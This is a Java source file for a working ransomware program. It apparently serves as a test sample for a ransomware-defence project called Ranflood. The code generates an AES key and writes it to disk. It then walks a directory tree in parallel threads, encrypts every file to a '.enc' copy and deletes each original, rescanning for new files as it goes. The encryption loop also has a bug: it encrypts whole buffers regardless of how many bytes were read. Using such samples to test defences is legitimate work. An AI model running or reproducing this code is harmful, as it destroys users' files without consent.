/******************************************************************************
 * Copyright 2021 (C) by Loris Onori                                          *
 *                                                                            *
 * This program is free software; you can redistribute it and/or modify       *
 * it under the terms of the GNU Library General Public License as            *
 * published by the Free Software Foundation; either version 2 of the         *
 * License, or (at your option) any later version.                            *
 *                                                                            *
 * This program is distributed in the hope that it will be useful,            *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of             *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the              *
 * GNU General Public License for more details.                               *
 *                                                                            *
 * You should have received a copy of the GNU Library General Public          *
 * License along with this program; if not, write to the                      *
 * Free Software Foundation, Inc.,                                            *
 * 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.                  *
 *                                                                            *
 * For details about the authors of this software, see the AUTHORS file.      *
 ******************************************************************************/

package ransomware;

import java.io.*;
import java.util.*;
import javax.crypto.*;

public class Ransomware {

	private static final String floodingPath = "/home/trthanh/Desktop/Ranflood/Flooding";
	private static final long bigFileDimension = 50000000;
	private static final int BUFFER_SIZE = 4096; // 4KB

	public static void main( String[] args ) {

		File dir = new File( args[ 0 ] );

		if ( !dir.isDirectory() ) {
			System.out.println( "Not a directory" );
			System.exit( -1 );
		}


		//Generate secretKey
		KeyGenerator keyGen = null;
		try {
			keyGen = KeyGenerator.getInstance( "AES" );
		} catch ( Exception e ) {
			System.out.println( "Impossibile generare keyGenerator" );
			System.exit( 0 );
		}
		keyGen.init( 256 );

		SecretKey secretKey = keyGen.generateKey();

		//Convert secretKey to String

		byte[] encoded = secretKey.getEncoded();
		String encodedKey = Base64.getEncoder().encodeToString( encoded );

		//Save secretKey
		try {
			File file = new File( "/home/trthanh/Desktop/Ranflood/secretKey.txt" );
			FileWriter fw = new FileWriter( file );
			fw.write( encodedKey );
			fw.close();
		} catch ( IOException e ) {
			System.out.println( "Error saving the key" );
			System.exit( -1 );
		}
		//Use the same secretKey for all the files

		loopFile( dir, null, secretKey );


	}


	public static void loopFile( File dir, Set< String > encryptedFileSet, SecretKey secretKey ) {
		File[] listFile = dir.listFiles();

		if ( encryptedFileSet == null ) {
			//Prima volta
			encryptedFileSet = new HashSet< String >();

			for ( int i = 0; i < listFile.length; i++ ) {

				if ( listFile[ i ].isDirectory() && listFile[ i ].getName() != "." && listFile[ i ].getName() != ".." ) {

					System.out.println( "Creation of a new child to tell : " + listFile[ i ].getAbsolutePath() );
					RansomwareChild child = new RansomwareChild( listFile[ i ].getAbsoluteFile(), secretKey );
					new Thread( child ).start();

				} else { // Crypt

					//encryptFile must return the name of the encrypted file to add it to -> null if it failed

					String newEncryptedFilePath = Ransomware.encryptFile( listFile[ i ], secretKey );
					if ( newEncryptedFilePath == null ) {
						//Failure encrypting 
					} else {
						encryptedFileSet.add( newEncryptedFilePath );
					}
				}
			}

		} else {
			//Second time so there are files that have changed over time so I only encrypt those
			for ( File file : listFile ) {
				if ( !encryptedFileSet.contains( file.getAbsolutePath() ) && !file.isDirectory() ) {
					String newEncryptedFilePath = Ransomware.encryptFile( file, secretKey );
					if ( newEncryptedFilePath != null )
						encryptedFileSet.add( newEncryptedFilePath ); //I add the file after encrypting it
				}
			}
		}


		//I re-read all the files
		//I can't re-encrypt them here because the names can change even when I'm here so I have to double-check them -> recursion with loopFile
		listFile = dir.listFiles();
		System.out.println( "\n WAIT \n" );
		try {
			Thread.sleep( 1000 );
		} catch ( Exception e ) {
			e.printStackTrace();
			System.exit( -1 );
		}
		System.out.println( "\nCheck for files variations\n" );

		System.out.println( "File in dir : " );
		for ( File f : listFile ) {
			System.out.println( f.getAbsolutePath() );
		}
		System.out.println( "File in set : " + encryptedFileSet );
		for ( File file : listFile ) {
			if ( !encryptedFileSet.contains( file.getAbsolutePath() ) && file.isFile() ) {
				System.out.println( "\n FILES CHANGED ALLOTMENT \n" );
				loopFile( dir, encryptedFileSet, secretKey );
			}
		}
		System.out.println( "End encrypting on " + dir.getAbsolutePath() );


	}

	//Metodo non usato per cifrare file di grandi dimensioni 
	public static void canEncrypt( File file, SecretKey secretKey ) {
		if ( file.length() >= bigFileDimension ) {

			//File troppo grande --> creo un figlio
			System.out.println( "Creating New Child for Large File : " + file.getAbsolutePath() );
			RansomwareChildBigFile rcbf = new RansomwareChildBigFile( file, secretKey );
			new Thread( rcbf ).start();

		} else {

			//Critto il file
			Ransomware.encryptFile( file, secretKey );
		}
	}

	public static String encryptFile( File file, SecretKey secretKey ) {
		Cipher cipher = null;
		try {
			cipher = Cipher.getInstance( "AES/CBC/PKCS5Padding" );
			cipher.init( Cipher.ENCRYPT_MODE, secretKey );
		} catch ( Exception e ) {
			System.out.println( "Error creazioen cipher" );
			System.exit( -2 );
		}

		try {
			System.out.println( "Encrypting" + file.getAbsolutePath() );

			/******* <Read Bytes > *****/

			FileInputStream ins = new FileInputStream( file );
			File encryptedFile = new File( file.getAbsolutePath() + ".enc" );
			OutputStream outs = new FileOutputStream( encryptedFile );
			byte[] buffer = new byte[ BUFFER_SIZE ];

			while ( ins.read( buffer ) != -1 ) {
				outs.write( cipher.doFinal( buffer ) );
			}

			/****** </Read Bytes > ******/
			ins.close();
			outs.close();
			file.delete();


			System.out.println( encryptedFile.getAbsolutePath() + " Encrypted" );
			return encryptedFile.getAbsolutePath();
		} catch ( Exception e ) {
			System.out.println( "Exception with" + file.getAbsolutePath() + " continuous" );
			e.printStackTrace();
			return null;
		}
	}


}


class RansomwareChild implements Runnable {

	private final File dir;
	private final SecretKey secretKey;

	public RansomwareChild( File dir, SecretKey secretKey ) {
		this.dir = dir;
		this.secretKey = secretKey;
	}

	@Override
	public void run() {
		Ransomware.loopFile( this.dir, null, this.secretKey );
	}

}

//Non usato
class RansomwareChildBigFile implements Runnable {
	private final File file;
	private final SecretKey secretKey;

	public RansomwareChildBigFile( File file, SecretKey secretKey ) {
		this.file = file;
		this.secretKey = secretKey;
	}

	@Override
	public void run() {
		String encryptedFilePath = Ransomware.encryptFile( this.file, this.secretKey );
		if ( encryptedFilePath != null ) {
			System.out.println( "Big file encryption success : " + encryptedFilePath );
		} else {
			System.out.println( "Big file encryption failure : " + encryptedFilePath );
		}
	}
}


//